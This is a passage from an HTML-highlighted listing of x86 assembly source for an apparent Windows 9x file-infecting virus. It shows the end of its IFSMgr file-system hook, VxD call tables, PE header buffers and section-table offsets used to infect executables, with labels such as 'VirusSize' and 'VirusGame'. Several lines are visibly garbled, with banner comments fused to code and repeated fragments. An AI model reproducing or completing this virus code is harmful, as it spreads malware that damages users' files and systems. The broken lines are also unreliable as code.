</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">FileModificationTime</span><span class="sc4">-</span><span class="sc5">@6</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 

</span><span class="sc1">; *************************** </span><span class="sc0">
</span><span class="sc1">; * Quit My Virus' * </span><span class="sc0">
</span><span class="sc1">; * IFSMgr_FileSystemHook * </span><span class="sc0">
</span><span class="sc1">; *************************** </span><span class="sc0">

</span><span class="sc5">QuitMyVirusFileSystemHook</span><span class="sc4">:</span><span class="sc0"> 

</span><span class="sc6">popad</span><span class="sc0"> 

</span><span class="sc6">ret</span><span class="sc0"> 

</span><span class="sc1">; ********************************************************* </span><span class="sc0">
</span><span class="sc1">; * Static Data * </span><span class="sc0">
</span><span class="sc1">; *****_RemoveFileSystemApiHook-_PageAllocate </span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">UniToBCSPath</span><span class="sc4">-</span><span class="sc5">IFSMgr_RemoveFileSystemApiHook</span><span class="sc0"> 
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc4">-</span><span class="sc5">UniToBCSPath</span><span class="sc0"> 

</span><span class="sc5">VxDCallIDTable</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00010053h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00400068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00400041h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00400032h</span><span class="sc0"> 
</span><span class="sc5">Virus</span><span class="sc0"> </span><span class="sc9">Size</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> 
</span><span class="sc1">; ********************************************************* </span><span class="sc0">

</span><span class="sc5">VirusSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> 
</span><span class="sc1">; + SizeOfVirusCodeSectionTableEndMark(04h) </span><span class="sc0">
</span><span class="sc1">; + NumberOfSections(??)*SizeOfVirusCodeSectionT </span><span class="sc0">
</span><span class="sc5">able</span><span class="sc4">(</span><span class="sc2">08h</span><span class="sc4">)</span><span class="sc0"> 
</span><span class="sc1">; + SizeOfTheFirstVirusCodeSectionTable(04h) </span><span class="sc0">

</span><span class="sc1">; ********************************************************* </span><span class="sc0">
</span><span class="sc1">; * Dynamic Data * </span><span class="sc0">
</span><span class="sc1">; ********************************************************* </span><span class="sc0">

</span><span class="sc5">VirusGameDataStartAddress</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">VirusSize</span><span class="sc0"> 
</span><span class="sc5">@6</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">VirusGameDataStartAddress</span><span class="sc0"> 
</span><span class="sc5">OnBusy</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 
</span><span class="sc5">FileModificationTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 

</span><span class="sc5">FileNameBuffer</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">FileNameBufferSize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0"> 
</span><span class="sc5">@7</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">FileNameBuffer</span><span class="sc0"> 

</span><span class="sc5">DataBuffer</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> 
</span><span class="sc5">@8</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">DataBuffer</span><span class="sc0"> 
</span><span class="sc5">NumberOfSections</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
</span><span class="sc5">TimeDateStamp</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
</span><span class="sc5">SymbolsPointer</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
</span><span class="sc5">NumberOfSymbols</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
</span><span class="sc5">SizeOfOptionalHeader</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
</span><span class="sc5">_Characteristics</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
</span><span class="sc5">Magic</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
</span><span class="sc5">LinkerVersion</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
</span><span class="sc5">SizeOfCode</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
</span><span class="sc5">SizeOfInitializedData</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
</span><span class="sc5">SizeOfUninitializedData</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
</span><span class="sc5">AddressOfEntryPoint</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
</span><span class="sc5">BaseOfCode</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
</span><span class="sc5">BaseOfData</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
</span><span class="sc5">ImageBase</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
</span><span class="sc5">@9</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> 
</span><span class="sc5">SectionAlignm</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
</span><span class="sc5">SizeOfImage</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
</span><span class="sc5">SizeOfHeaders</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> 
</span><span class="sc5">SizeOfImageHeaderToRead</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">NumberOfSections</span><span class="sc0"> 

</span><span class="sc5">NewAddressOfEntryPoint</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">DataBuffer</span><span class="sc0"> </span><span class="sc1">; DWORD </span><span class="sc0">
</span><span class="sc5">SizeOfImageHeaderToWrite</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0"> 

</span><span class="sc5">StartOfSectionTable</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">@9</span><span class="sc0"> 
</span><span class="sc5">SectionName</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">StartOfSectionTable</span><span class="sc0"> </span><span class="sc1">; QWORD </span><span class="sc0">
</span><span class="sc5">VirtualSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">StartOfSectionTable</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc0"> </span><span class="sc1">; DWORD </span><span class="sc0">
</span><span class="sc5">VirtualAddress</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">StartOfSectionTable</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc0"> </span><span class="sc1">; DWORD </span><span class="sc0">
</span><span class="sc5">SizeOfRawData</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">StartOfSectionTable</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc1">; DWORD </span><span class="sc0">
</span><span class="sc5">PointerToRawData</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">StartOfSectionTable</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc0"> </span><span class="sc1">; DWORD </span><span class="sc0">
</span><span class="sc5">PointerToRelocations</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">StartOfSectionTable</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">; DWORD </span><span class="sc0">
</span><span class="sc5">PointerToLineNumbers</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">StartOfSectionTable</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc0"> </span><span class="sc1">; DWORD </span><span class="sc0">
</span><span class="sc5">NumberOfRelocations</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">StartOfSectionTable</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc1">; WORD </span><span class="sc0">
</span><span class="sc5">NumberOfLinenNmbers</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">StartOfSectionTable</span><span class="sc4">+</span><span class="sc2">22h</span><span class="sc0"> </span><span class="sc1">; WORD </span><span class="sc0">
</span><span class="sc5">Characteristics</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">StartOfSectionTable</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc0"> </span><span class="sc1">; DWORD </span><span class="sc0">
</span><span class="sc5">SizeOfScetionTable</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">Characteristics</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">-</span><span class="sc5">SectionName</span><span class="sc0"> 

</span><span class="sc1">; ********************************************************* </span><span class="sc0">
</span><span class="sc1">; * Virus Total Need Memory * </span><span class="sc0">
</span><span class="sc1">; ********************************************************* </span><span class="sc0">

</span><span class="sc5">VirusNeedBaseMemory</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> 

</span><span class="sc5">VirusTotalNeedMemory</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">@9</span><span class="sc0"> 
</span><span class="sc1">; + NumberOfSections( + NumberOfSections(??)*SizeOfVirusCodeSectionT </span><span class="sc0">
</span><span class="sc5">able</span><span class="sc4">(</span><span class="sc2">08h</span><span class="sc4">)</span><span class="sc0"> 
</span><span class="sc1">; + SizeOfTheFirstVirusCodeSectionTable(04h) </span><span class="sc0">

</span><span class="sc1">; ********************************************************* </span><span class="sc0">
</span><span class="sc1">; ********************************************************* </span><span class="sc0">

</span><span class="sc5">VirusGame</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0"> 

</span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">FileHeader</span></div></body>
</html>
